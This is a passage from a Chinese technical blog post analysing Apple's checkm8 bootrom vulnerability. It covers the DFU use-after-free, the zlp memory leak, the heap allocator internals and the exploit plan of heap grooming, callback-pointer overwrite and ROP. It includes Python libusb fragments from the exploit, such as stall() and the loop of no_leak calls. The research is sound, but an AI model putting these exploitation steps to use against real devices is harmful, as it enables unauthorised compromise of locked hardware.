<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">data_received</span><span class="p">(</span><span class="n">u_int32_t</span> <span class="n">received</span><span class="p">)</span>
<span class="p">{</span>

	<span class="k">if</span><span class="p">((</span><span class="n">total_received</span> <span class="o">+</span> <span class="n">received</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">image_buffer_size</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">set_status</span><span class="p">(</span><span class="n">errADDRESS</span><span class="p">,</span> <span class="n">STANDARD_DELAY_MS</span><span class="p">,</span> <span class="n">dfuERROR</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
	<span class="k">else</span> <span class="p">{</span>
		<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">image_buffer</span><span class="p">[</span><span class="n">total_received</span><span class="p">],</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">io_buffer</span><span class="p">,</span> <span class="n">received</span><span class="p">);</span>
		<span class="n">total_received</span> <span class="o">+=</span> <span class="n">received</span><span class="p">;</span>
		<span class="n">set_status</span><span class="p">(</span><span class="n">errOK</span><span class="p">,</span> <span class="n">STANDARD_DELAY_MS</span><span class="p">,</span> <span class="n">dfuDNLOAD_IDLE</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="usb资源析构">USB资源析构</h2>

<p>若DFU镜像接收完毕或者USB被reset，getDFUImage调用usb_quiesce函数释放USB资源。</p>

<p>usb_init中分配的0x800大小用于接收DFU镜像的io_buffer也在这里被释放。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-USB%E8%B5%84%E6%BA%90%E6%9E%90%E6%9E%84.jpg" alt="checkm8-USB资源析构.jpg" /></p>

<h2 id="uaf-漏洞函数">UAF 漏洞函数</h2>

<p>若设备在接收DFU镜像过程中主机取消了传输，将导致done标签之后的全局变量继续保留。</p>

<p>ep0_data_phase_buffer指针是当前在io_buffer的写入位置，</p>

<p>ep0_data_phase_rcvd是接收到的字节数，</p>

<p>ep0_data_phase_length是本轮DFU分段长度，由setup报文的wLength字段确定，不超过0x800。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">handle_ep0_data_phase</span> <span class="p">(</span><span class="n">u_int8_t</span> <span class="o">*</span><span class="n">rx_buffer</span><span class="p">,</span> <span class="n">u_int32_t</span> <span class="n">data_rcvd</span><span class="p">,</span> 
																				<span class="n">bool</span> <span class="o">*</span><span class="n">data_phase</span><span class="p">)</span>
<span class="p">{</span>
	<span class="p">......</span>
    
	<span class="k">if</span><span class="p">((</span><span class="n">ep0_data_phase_rcvd</span> <span class="o">==</span> <span class="n">ep0_data_phase_length</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">data_rcvd</span> <span class="o">!=</span> <span class="n">EP0_MAX_PACKET_SIZE</span><span class="p">))</span>
	<span class="p">{</span>    
	  <span class="n">data_received</span><span class="p">(</span><span class="n">ep0_data_phase_rcvd</span><span class="p">);</span>
		<span class="n">usb_core_send_zlp</span><span class="p">();</span> <span class="c1">//we should check returnval of call and possibly stall</span>
  <span class="p">}</span>  
		<span class="k">goto</span> <span class="n">done</span><span class="p">;</span>   
	<span class="p">}</span>
	
	<span class="k">return</span><span class="p">;</span>
	
<span class="n">done</span><span class="o">:</span>
    <span class="n">ep0_data_phase_rcvd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ep0_data_phase_length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ep0_data_phase_buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">ep0_data_phase_if_num</span> <span class="o">=</span> <span class="n">NO_DATA_PHASE_HANDLER</span><span class="p">;</span>
    <span class="o">*</span><span class="n">data_phase</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
<span class="err">}</span>
</code></pre></div></div>

<p>若主机再向设备发送bmRequestType=0x21，bRequest=DFU_CLR_STATUS的setup报文，则dfu_done被置位，产生一个dfu_event事件。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">handle_interface_request</span><span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_request</span> <span class="o">*</span><span class="n">request</span><span class="p">,</span> 
																		<span class="kt">uint8_t</span> <span class="o">**</span><span class="n">out_buffer</span><span class="p">){</span>
	<span class="k">if</span><span class="p">((</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">bmRequestType</span> <span class="o">&amp;</span> <span class="n">USB_REQ_DIRECTION_MASK</span><span class="p">)</span> <span class="o">==</span> <span class="n">USB_REQ_HOST2DEVICE</span><span class="p">){</span>
		<span class="k">switch</span><span class="p">(</span><span class="n">bRequest</span><span class="p">){</span>
			<span class="k">case</span> <span class="n">DFU_CLR_STATUS</span> <span class="p">:</span>
			<span class="k">case</span> <span class="n">DFU_ABORT</span><span class="p">:</span>
			<span class="p">{</span>
				<span class="p">......</span>
				<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">dfu_done</span><span class="p">)</span> <span class="p">{</span>
					<span class="n">completion_status</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
					<span class="n">dfu_done</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>             <span class="c1">//dfu_done置位</span>
					<span class="n">event_signal</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dfu_event</span><span class="p">);</span>    <span class="c1">//产生dfu_event事件</span>
				<span class="p">}</span>
				<span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>
		<span class="p">......</span>
<span class="p">}</span>
</code></pre></div></div>

<p>在dfu_event事件上睡眠等待的getDFUImage被唤醒，调用usb_quiesce释放USB资源。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kt">int</span> <span class="nf">getDFUImage</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">maxlen</span><span class="p">)</span>
<span class="p">{</span>
	<span class="p">......</span>
	
	<span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">dfu_done</span><span class="p">)</span> 
		<span class="n">event_wait</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dfu_event</span><span class="p">);</span>
    
	<span class="n">usb_quiesce</span><span class="p">();</span>      <span class="c1">//释放USB资源，包括io_buffer</span>
    
	<span class="p">......</span>
<span class="p">}</span>
</code></pre></div></div>

<p>boot_selected函数中镜像校验失败，重入getDFUImage函数，重新分配USB资源，重新接收DFU镜像。</p>

<p>但是指示写入位置的ep0_data_phase_buffer还是沿用的上一轮getDFUImage留下的。</p>

<p>若本轮io_buffer分配的位置和前一轮一样，那么这并不会造成什么破坏。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E6%B2%A1%E6%9C%89%E9%A9%BB%E7%95%99%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E9%87%8D%E6%96%B0%E5%88%86%E9%85%8D.jpg" alt="checkm8-没有驻留情况下的重新分配.jpg" /></p>

<h2 id="内存泄漏bug">内存泄漏BUG</h2>

<p>若getDFUImage释放USB资源时，发生了内存泄漏，部分对象得不到释放，第二轮getDFUImage将会得到不同的堆布局，此时通过ep0_data_phase_buffer指针写入数据就会导致堆溢出。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E9%A9%BB%E7%95%99%E4%B8%8B%E7%9A%84%E9%87%8D%E6%96%B0%E5%88%86%E9%85%8D.jpg" alt="checkm8-驻留下的重新分配.jpg" /></p>

<p>内存泄漏的对象是usb_device_io_request。</p>

<p>该对象的作用是，若数据传输方向是设备到主机，那么会申请一个usb_device_io_request对象，挂载到ep-&gt;io_head链表上，ep是USB传输端点，是USB设备的最小功能单元，链表出入顺序是FIFO。</p>

<p>其中io_buffer指针指向数据传输缓冲区，例如USB设备描述符，</p>

<p>io_length表示传输的数据量，</p>

<p>callback是回调函数，在usb_device_io_request销毁之前调用，指向standard_device_request_cb函数，</p>

<p>next是链表指针，指向下一个usb_device_io_request对象，通过next指针形成单向链表。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">usb_device_io_request</span><span class="p">{</span>
		<span class="n">u_int32_t</span>                       <span class="n">endpoint</span><span class="p">;</span>
		<span class="k">volatile</span> <span class="n">u_int8_t</span>               <span class="o">*</span><span class="n">io_buffer</span><span class="p">;</span>
		<span class="kt">int</span>                             <span class="n">status</span><span class="p">;</span>
		<span class="n">u_int32_t</span>                       <span class="n">io_length</span><span class="p">;</span>
		<span class="n">u_int32_t</span>                       <span class="n">return_count</span><span class="p">;</span>
		<span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">callback</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">io_request</span><span class="p">);</span>
		<span class="k">struct</span> <span class="n">usb_device_io_request</span>    <span class="o">*</span><span class="n">next</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p>当设备接收到bmRequest=0x21，bRequest=0x4（DFU_CLR_STATUS）的SETUP package，那么会触发usb_quiesce释放USB资源，该过程会释放ep→io_buffer队列，每个对象依次调用callback回调函数。在此过程中会发生usb_device_io_request对象的内存泄漏。</p>

<p>释放释放ep→io_buffer队列的路径为：</p>

<p>usb_quiesce → usb_core_stop → usb_controller_stop → synopsys_otg_stop → usb_core_deactivate_endpoint → usb_controller_abort_endpoint → synopsys_otg_abort_endpoint</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">synopsys_otg_abort_endpoint</span><span class="p">(</span><span class="n">u_int32_t</span> <span class="n">endpoint</span><span class="p">){</span>
	<span class="p">......</span>
	<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span><span class="p">;</span>         <span class="c1">//摘下端点的IO队列</span>
	<span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_tail</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="p">......</span>
	<span class="k">while</span><span class="p">(</span><span class="n">aborted_list</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">aborted_req</span> <span class="o">=</span> <span class="n">aborted_list</span><span class="p">;</span>
		<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
		<span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">=</span> <span class="n">USB_IO_ABORTED</span><span class="p">;</span>
		<span class="n">usb_core_complete_endpoint_io</span><span class="p">(</span><span class="n">aborted_req</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>io_length取主机请求的数据长度和设备实际需要传输的数据长度两者之间的较小值。例如主机请求192字节的设备描述符，而设备描述符实际长度为198字节，那么io_length=192。</p>

<p>若当前usb_device_io_request对象传输的数据长度io_length是0x40的倍数，且SETUP package请求的数据量大于io_length，那么设备向主机发送一个零长度数据包（zero length package）表示数据传输完毕。</p>

<p>DFU协议栈这么做的理由是，若主机接收到的数据包长度小于0x40，则表示这是最后一个数据包。若主机请求的数据量大于设备需要传输的实际的数据量，这种情况下设备当然就是有多少数据就传多少数据，如果设备实际传输的数据量是0x40的倍数，那么主机便无法判断最后一个数据包。所以就需要设备主动发送一个zlp表示数据传输完毕。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">usb_core_complete_endpoint_io</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">io_req</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">if</span><span class="p">(</span><span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
	<span class="p">}</span>  
	<span class="n">free</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
	<span class="n">io_req</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">standard_device_request_cb</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">req</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">if</span><span class="p">((</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span> <span class="o">%</span> <span class="mh">0x40</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> 
					<span class="p">(</span><span class="n">setup_request</span><span class="p">.</span><span class="n">wLength</span> <span class="o">&gt;</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">usb_core_send_zlp</span><span class="p">();</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>需要为zlp再申请一个usb_device_io_request对象，再通过usb_controller_do_endpoint_io函数挂载到ep→io_head链表上。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">usb_core_send_zlp</span> <span class="p">(</span><span class="kt">void</span><span class="p">){</span>
	<span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">io_request</span> <span class="o">=</span> 
													<span class="n">alloc_ep0_device_io_request</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="p">......</span>
	<span class="n">usb_controller_do_endpoint_io</span><span class="p">(</span><span class="n">io_request</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>再回到synopsys_otg_abort_endpoint函数，此时的ep-&gt;io_head链表实际上不会再有任何地方引用，ep-&gt;io_head也将随着ep对象的释放而失效，那么刚刚加进去的zlp对象也就失去了引用，没有任何地方能释放zlp，造成了内存泄漏。</p>

<p>所以总结一下checkm8漏洞能够成立的2个要点：</p>

<ul>
  <li>仅仅有UAF还不能造成内存破坏</li>
  <li>配合内存泄漏可以覆盖相邻对象</li>
</ul>

<h2 id="利用思路">利用思路</h2>

<p>构造如下堆布局，在fs conf对象后面分配usb_device_io_request对象。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%AC%AC_20_%E9%A1%B5.jpg" alt="checkm8-第 20 页.jpg" /></p>

<p>堆溢出覆盖usb_device_io_request对象的callback指针和next指针，释放usb_device_io_request对象时就会调用callback函数指针，且参数是对象本身。</p>

<p>释放usb_device_io_request对象时，沿着next指针遍历，可以引导到攻击者构造的区域，实现更多的rop功能。</p>

<p>利用思路概括起来就是：</p>

<ol>
  <li>利用内存泄漏进行堆风水，为UAF覆盖函数指针创造条件</li>
  <li>UAF覆盖callback函数指针</li>
  <li>写入shellcode和ROP链</li>
  <li>释放对象触发函数指针调用，劫持程序流到ROP和shellcode</li>
</ol>

<h2 id="堆块控制能力">堆块控制能力</h2>

<p><strong>1. 分配和释放usb_device_io_request对象的时机可控</strong></p>

<p>堆风水的重要前提是攻击者能够控制堆块的分配和释放，无论这种控制是直接的还是间接的。</p>

<ul>
  <li>堆块的分配</li>
</ul>

<p>攻击者只需要向设备发送一个device to host类型的SETUP package向设备请求数据，就能在堆上分配一个usb_device_io_request对象。</p>

<ul>
  <li>堆块的释放</li>
</ul>

<p>usb_device_io_request被加入ep→io_buffer队列进行数据传输，传输完毕后被销毁，这个过程攻击者无法介入。这种情况下攻击者无法连续分配多个usb_device_io_request对象进行堆排布。</p>

<p>攻击者向设备发送bmRequest=0x80，bRequest=0x6，wLength=0xC0的SETUP package，请求USB设备描述符。</p>

<p>设备描述符的实际长度为0xC6字节，设备按照攻击者的要求传输前0xC0个字节。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">stall</span><span class="p">(</span><span class="n">device</span><span class="p">):</span>   
	<span class="nf">libusb1_async_ctrl_transfer</span><span class="p">(</span><span class="n">device</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mh">0x304</span><span class="p">,</span> <span class="mh">0x40A</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mf">0.00001</span><span class="p">)</span>
</code></pre></div></div>

<p>0.00001秒后主机单方面取消了数据接收，此时设备仅发送了第一个0x40分段。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">transfer_ptr</span> <span class="o">=</span> <span class="nf">libusb1_create_ctrl_transfer</span><span class="p">(</span><span class="n">device</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">request_timeout</span><span class="p">)</span>
<span class="n">usb</span><span class="p">.</span><span class="n">backend</span><span class="p">.</span><span class="n">libusb1</span><span class="p">.</span><span class="n">_lib</span><span class="p">.</span><span class="nf">libusb_submit_transfer</span><span class="p">(</span><span class="n">transfer_ptr</span><span class="p">)</span>

<span class="k">while</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="n">timeout</span> <span class="o">/</span> <span class="mf">1000.0</span><span class="p">:</span>
  <span class="k">pass</span>

<span class="n">usb</span><span class="p">.</span><span class="n">backend</span><span class="p">.</span><span class="n">libusb1</span><span class="p">.</span><span class="n">_lib</span><span class="p">.</span><span class="nf">libusb_cancel_transfer</span><span class="p">(</span><span class="n">transfer_ptr</span><span class="p">)</span>
</code></pre></div></div>

<p>后续设备一直收不到主机的IN token请求，传输任务阻塞，usb_device_io_request对象滞留在传输队列中。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-25_13.50.06.png" alt="截屏2025-03-25 13.50.06.png" /></p>

<p>主机向设备发送RESET命令，传输队列中的usb_device_io_request对象被全部释放。</p>

<p>主机通过中断device to host传输的方式，可以精确控制usb_device_io_request对象的分配和释放。</p>

<p><strong>2. 分配连续usb_device_io_request对象</strong></p>

<p>device to host传输阻塞的过程中，设备还能继续接收新的device to host传输请求，新的usb_device_io_request对象继续加入传输队列。</p>

<p>由于ep→io_head队列是FIFO的进出方式，后进来的usb_device_io_request对象也被阻塞，造成连续分配的效果。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nf">stall</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">hole</span><span class="p">):</span>
	 <span class="nf">no_leak</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>
</code></pre></div></div>

<p><strong>3. 制造usb_device_io_request对象内存泄漏</strong></p>

<p>若传输任务的数据量是0x40的倍数，且比实际请求的数据量小，在释放usb_device_io_request对象之前又会申请一个zlp usb_device_io_request对象，该zlp对象失去引用变成内存泄漏。</p>

<p>因此攻击者可以通过控制wLength字段的大小，制造内存泄漏。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">standard_device_request_cb</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">req</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">if</span><span class="p">((</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span> <span class="o">%</span> <span class="mh">0x40</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> 
					<span class="p">(</span><span class="n">setup_request</span><span class="p">.</span><span class="n">wLength</span> <span class="o">&gt;</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">usb_core_send_zlp</span><span class="p">();</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>要注意的是堆块大小不仅包括usb_device_io_request对象，还包括0x40大小的元数据。</p>

<h2 id="堆管理器">堆管理器</h2>

<p><strong>1. 核心数据结构</strong></p>

<p>Apple自己开发了堆管理器，SecureROM和iBoot阶段使用的都是同一套代码。</p>

<p>实现了malloc、realloc、calloc、free函数，memalign用于分配大内存。</p>

<p>底层实现了heap_malloc和heap_free做具体的分配和释放。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_14.00.12.png" alt="截屏2025-03-12 14.00.12.png" /></p>

<p>堆管理器的核心数据结构是heap_block、free_block。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_14.15.00.png" alt="截屏2025-03-12 14.15.00.png" /></p>

<p>heap_block是活动对象的头部元数据，malloc成功之后把指向数据区域的指针返回给用户。</p>

<p>释放对象时，元数据变成free_block，原本的数据区头部会新增next_in_bin和pre_in_bin两个指针，用于加入对应大小的bin链表中。</p>

<p>堆块分配大小都是heap_block对象大小的整数倍，heap_block对象大小为0x40字节。</p>

<p>若小于free_block对象的大小0x50字节，则按照free_block对象大小来分配。</p>

<p>所以分配对象的大小至少为0x50字节。</p>

<p>这么做的目的是在满足用户需求的同时，确保能容纳下堆块的元数据。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span> <span class="nf">required_size</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">){</span>
	<span class="n">size</span> <span class="o">+=</span> <span class="mi">2</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">heap_block</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
	<span class="n">size</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">heap_block</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">free_block</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">free_block</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="n">size</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_14.55.57.png" alt="截屏2025-03-12 14.55.57.png" /></p>

<p><strong>2. 空闲对象链表</strong></p>

<p>bins[32]数组是空闲对象链表的核心，作用是把空闲对象按照大小分类，加入不同的链表中。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_13.53.05.png" alt="截屏2025-03-12 13.53.05.png" /></p>

<p>计算bin下标的逻辑如下，首先size除以64计算是几个heap_block大小。</p>

<p>32减去size前导0的数量就是bin的下标。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">unsigned</span> <span class="nf">compute_bin</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">){</span>
	<span class="kt">unsigned</span> <span class="n">result</span><span class="p">;</span>
	<span class="n">size</span> <span class="o">=</span> <span class="n">quantify_size</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>   <span class="c1">//计算是几个heap_block大小</span>

	<span class="c1">// clz can't operate on &gt; 32-bit values, so return an invalid bin</span>
	<span class="c1">// number to force grab_chunk to fail and free_list_add to assert</span>
	<span class="k">if</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">size</span> <span class="o">&gt;</span> <span class="n">UINT32_MAX</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">return</span> <span class="n">NUM_BINS</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">result</span> <span class="o">=</span> <span class="n">NUM_BINS</span> <span class="o">-</span> <span class="n">__builtin_clz</span><span class="p">((</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">size</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>举例来说，若释放对象大小为0x50，除以0x40得1，下标就是32 - 31 = 1，因此加入bin[1]链表。</p>

<p>链表的加入方式是从头部加入。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E5%A0%86%E7%AE%A1%E7%90%86%E5%99%A8%E7%9A%84%E5%AE%9E%E7%8E%B0_%E7%A9%BA%E9%97%B2%E9%93%BE%E8%A1%A8.jpg" alt="checkm8-堆管理器的实现 空闲链表.jpg" /></p>

<p><strong>3. 空闲对象的合并</strong></p>

<p>释放一个对象时，会检查相邻前后的对象是否活跃，若相邻对象不活跃则与之合并。</p>

<p>首先把相邻的对象从bin链表上取下，修改元数据this_size字段相加。</p>

<p>合并后的对象设置this_free标志位，重新加入到bins链表中。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="k">struct</span> <span class="n">heap_block</span> <span class="o">*</span>
<span class="nf">merge_blocks_left</span><span class="p">(</span><span class="k">struct</span> <span class="n">heap_block</span> <span class="o">*</span><span class="n">left</span><span class="p">,</span> <span class="k">struct</span> <span class="n">heap_block</span> <span class="o">*</span><span class="n">right</span><span class="p">){</span>
	<span class="n">free_list_remove</span><span class="p">((</span><span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="p">)(</span><span class="n">left</span><span class="p">));</span>  <span class="c1">//</span>

	<span class="n">left</span><span class="o">-&gt;</span><span class="n">this_size</span> <span class="o">+=</span> <span class="n">right</span><span class="o">-&gt;</span><span class="n">this_size</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">HEAP_CHECKS</span><span class="p">)</span> <span class="p">{</span>
		<span class="c1">// the right block is going away, so make sure it no longer</span>
		<span class="c1">// looks like a real block</span>
		<span class="n">right</span><span class="o">-&gt;</span><span class="n">this_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="n">right</span><span class="o">-&gt;</span><span class="n">prev_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="n">right</span><span class="o">-&gt;</span><span class="n">checksum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="n">left</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">heap_free</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">){</span>
	<span class="k">struct</span> <span class="n">heap_block</span> <span class="o">*</span><span class="n">block</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">heap_block</span> <span class="o">*</span><span class="n">left</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">heap_block</span> <span class="o">*</span><span class="n">right</span><span class="p">;</span>
	
	<span class="n">left</span> <span class="o">=</span> <span class="n">prev_block</span><span class="p">(</span><span class="n">block</span><span class="p">);</span>		<span class="c1">//指向前一个堆块的heap_block</span>
	<span class="n">right</span> <span class="o">=</span> <span class="n">next_block</span><span class="p">(</span><span class="n">block</span><span class="p">);</span>		<span class="c1">//指向后一个堆块的heap_block</span>
	
	<span class="n">block</span> <span class="o">=</span> <span class="n">merge_blocks_left</span><span class="p">(</span><span class="n">left</span><span class="p">,</span> <span class="n">block</span><span class="p">);</span>
	<span class="n">block</span> <span class="o">=</span> <span class="n">merge_blocks_right</span><span class="p">(</span><span class="n">block</span><span class="p">,</span> <span class="n">right</span><span class="p">);</span>
	
	<span class="n">block</span><span class="o">-&gt;</span><span class="n">this_free</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
	<span class="n">free_list_add</span><span class="p">((</span><span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="p">)</span><span class="n">block</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p><strong>4. 堆块分配策略</strong></p>

